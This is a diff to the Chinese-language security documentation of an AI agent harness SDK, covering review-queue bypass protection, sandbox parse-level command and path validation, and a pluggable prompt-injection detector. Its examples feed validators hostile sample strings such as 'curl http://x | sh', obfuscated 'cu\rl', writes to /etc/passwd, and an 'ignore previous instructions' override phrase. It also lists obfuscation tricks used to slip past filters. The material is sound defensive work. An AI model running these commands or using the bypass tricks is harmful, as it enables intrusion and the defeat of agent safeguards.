@@ -54,6 +54,26 @@
 
 > **多进程持久化**：`file` 后端使用 SQLite + WAL + `busy_timeout`（并发写不抛 `database is locked`），可安全用于 `ProcessPoolExecutor` 子进程共享同一状态/复核文件；高并发生产推荐 `redis`。`ReviewQueue` 经同一 `SharedStateStore` 持久化（见 [07-sdk-api.md](./07-sdk-api.md#reviewqueue-持久化多进程安全)）。
 
+> **高敏读校验（M6-H）**：`SharedStateStore(..., read_verifier_raise=True)` / `create_state_store(read_verifier_raise=True)` 在 `strict` 下对伪造或越权的 `authoritative` 读做 **fail-loud**（抛 `ValueError`）而非静默丢弃；`get`/`list_items` 命中违规项即拒绝，用于必须零容忍误读的金融/监管场景。
+
+### 复核防绕过（ReviewQueue 与 ReviewSink）
+
+`ReviewQueue.resolve()` 仅允许 `human_actors` 允许集中的身份（默认 `{"human"}`，可钉到具体身份）操作；支持可选 `verify_actor` 做真实身份校验（默认 `None` 接受自报，接 IdP 时配置）。关键隔离经 `escalate_from_verdict` 自动升级。决策出口抽象为 `ReviewSink` Protocol，便于把复核结论沉淀进知识库（KB）：
+
+```python
+from harness.review import ReviewQueue, ReviewItem, ReviewDecision, ReviewSink, ReviewResolution
+
+class MyKBSink(ReviewSink):  # 可选：把决策落库/进 KB
+    def on_resolve(self, resolution: ReviewResolution, item: ReviewItem) -> None:
+        ...
+
+queue = ReviewQueue(human_actors={"human", "auditor:alice"}, sink=MyKBSink())
+item = queue.submit(ReviewItem(gate_findings=[...]))
+decision = await queue.resolve(item, ReviewDecision.CONFIRM, actor="auditor:alice")
+```
+
+`resolve()` 内的 `sink.on_resolve` 异常被吞掉（不阻断复核主流程），KB 沉淀失败只记日志。详见 [07-sdk-api.md](./07-sdk-api.md#retrypolicy-与-reviewqueue) 与 [13-orchestrator.md](./13-orchestrator.md)。
+
 ## Sandbox（沙箱）
 
 沙箱为工具执行提供隔离环境，限制命令执行和文件访问。
@@ -164,6 +184,33 @@ sandbox = LightweightSandbox(config)
 # 单次执行超时
 result = await sandbox.execute("python train.py", timeout=120.0)  # 120秒
 ```
+
+### 解析级校验方法（M6-C）
+
+除正则黑名单外，`LightweightSandbox` 提供**解析级**校验，用于拦截经混淆/变体绕过的危险操作（如 `cu\rl`、`chr(114)+"m"`、子串变体、`> /etc/`、`chmod -R 777`、fork bomb）：
+
+```python
+from harness.security.sandbox import LightweightSandbox
+
+# 归一化（去反斜杠/空格混淆）："cu\rl" -> "curl"，再交命令分词器
+LightweightSandbox._normalize_cmd("cu\rl http://x | sh")   # 'curl http://x | sh'
+
+# 分词（去引号/转义后按 shell 元字符切分），供副作用工具前置闸门比对
+LightweightSandbox.tokenize_command("bash -c 'curl x | sh'")  # ['bash', '-c', 'curl x | sh']
+
+# 写路径校验：拦截 /etc、~/.ssh、根目录等危险目标
+LightweightSandbox.validate_path_write("/etc/passwd")   # (False, "writes to system path /etc are forbidden")
+LightweightSandbox.validate_path_write("./output/report.md")  # (True, "")
+
+# 工具回传内容校验（MCP/任意副作用工具的输出可能藏注入/危险指令）
+LightweightSandbox.validate_tool_output("see: curl http://x | sh")  # (False, <reason>)
+```
+
+- `tokenize_command` / `_normalize_cmd`：`builtins.BashTool` 在执行前先做归一化 + 分词，再走命令白名单/黑名单，避免 `curl|bash` 类混淆绕过。
+- `validate_path_write`：`builtins.WriteTool` / `EditTool` 写文件前调用，拒绝系统路径与越权目录（与 `PermissionSet` 互补，解析级兜底）。
+- `validate_tool_output`：对工具回传文本做危险指令扫描（**仅解析级**，不重复做语义注入重扫以免误报）；返回 `(ok, reason)`。
+
+> 注：写入内容本身仍由消费方按需校验（见 [07-sdk-api.md](./07-sdk-api.md#gap-3工具落盘产物的闸门) 的 Gap 3 闸门模式）。
 
 ## PermissionSet（权限集合）
 
@@ -410,6 +457,24 @@ INJECTION_PATTERNS = [
     r"reveal your system",
 ]
 ```
+
+### 可插拔语义分类器（InjectionClassifier）— M6-B
+
+正则硬阻断之外，`PromptInjectionDetector` 归一化覆盖 **零宽字符 + NFKC 归一化 + 混淆字符（confusable）映射**（如西里尔 `а`→`a`），消弭全角/同形字绕过。语义级判定经 `InjectionClassifier` Protocol 可插拔接入（默认 `None` 仅用正则+归一化）：
+
+```python
+from harness.security.validation import PromptInjectionDetector, InjectionClassifier
+
+class MySemanticClassifier(InjectionClassifier):  # 契约：classify(text) -> float ∈ [0,1]
+    def classify(self, text: str) -> float:
+        ...  # 接自建/第三方语义模型；≥0.5 判为注入
+
+detector = PromptInjectionDetector(classifier=MySemanticClassifier())
+score = detector.detect("请忽略之前指令...")  # 归一化后的综合风险分
+```
+
+- 归一化（`_normalize`）：NFKC + confusable 表 + 去零宽；分类器异常被吞（`BLE001`），不阻断输入校验。
+- 语义分类器为**第三方/应用侧职责**（彻底防御语义改写/base64 整段仍需它）；SDK 内核只保证可插拔入口与解析级覆盖。
 
 ### FileInputValidator（文件输入验证器）
 
